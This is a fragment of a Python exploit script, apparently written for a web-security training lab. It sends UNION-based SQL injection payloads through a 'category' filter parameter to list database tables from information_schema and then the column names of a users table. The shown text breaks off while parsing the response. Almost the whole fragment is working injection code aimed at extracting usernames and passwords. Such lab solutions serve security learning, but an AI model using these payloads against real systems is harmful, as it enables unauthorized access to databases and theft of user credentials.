...
def extract_users_table(url:str):
    url = url + "/filter?category=Lifestyle' UNION SELECT TABLE_NAME, NULL From information_schema.tables --"
...
def extract_username_password_columns(url:str, users_table:str):
    url = url + "/filter?category=" + f"Lifestyle' UNION SELECT COLUMN_NAME, NULL From information_schema.columns where TABLE_NAME = '{users_table}' --"
    r = requests.get(url, proxies=proxies, verify=False)
    if r.status_code == 200:
        soup = BeautifulSoup(r.text, 'html.parser')
